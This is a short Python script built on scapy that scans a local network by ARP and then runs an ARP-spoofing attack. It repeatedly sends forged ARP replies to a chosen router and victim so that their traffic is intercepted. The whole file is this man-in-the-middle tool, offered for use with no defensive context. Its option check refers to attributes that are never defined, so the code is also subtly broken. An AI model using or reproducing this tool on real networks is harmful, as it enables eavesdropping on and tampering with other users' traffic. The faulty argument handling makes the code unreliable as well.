#!/usr/bin/env python
import scapy.all as scapy
import optparse
import time


def ARP_scan(ip, time=1):
    arp_scaner = scapy.ARP(pdst=ip) # создания своего арп запроса
    brodcasts = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packets = brodcasts/arp_scaner
    answered = scapy.srp(arp_packets, timeout=int(time), verbose=False)[0]

    client_list = []
    for element in answered:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc, "Ver": str(element[1].ptype)}
        client_list.append(client_dict)
    return client_list


def print_result(client_list):
    i = 0
    print("________________________________________________________________________________________")
    print("Number\t|\tIP\t\t|\tMAC address\t\t|\tVesion IP\t|")
    print("----------------------------------------------------------------------------------------")
    for element in client_list:
        print(str(i) + "\t|\t" + element["ip"] + "\t|\t" + element["mac"] + "\t|\t" + element["Ver"] + "\t\t|")
        print("----------------------------------------------------------------------------------------")
        i = i+1


def argument():
    p = optparse.OptionParser()
    p.add_option("-i", "--ip", dest="ip", help="IP address local network")
    (options, arguments) = p.parse_args()
    if not options.ip_localhost and not options.interface:
        p.error()
    else:
        return options


def arp_packet(ip, mac, ip_hack):
    packet = scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_hack)
    scapy.send(packet, verbose=False)


a = argument()
f = ARP_scan(a.ip, 2)
print_result(f)
a = int(input("[+] Your use IP router and MAC address:"))
b = int(input("[+] Your use IP user and MAC address:"))
i = 0
while True:
    arp_packet(f[b]["ip"], f[b]["mac"], f[a]["ip"])
    arp_packet(f[a]["ip"], f[a]["mac"], f[b]["ip"])
    i = i + 2
    print("[+] Sent " + str(i) + " packet")
    time.sleep(2)
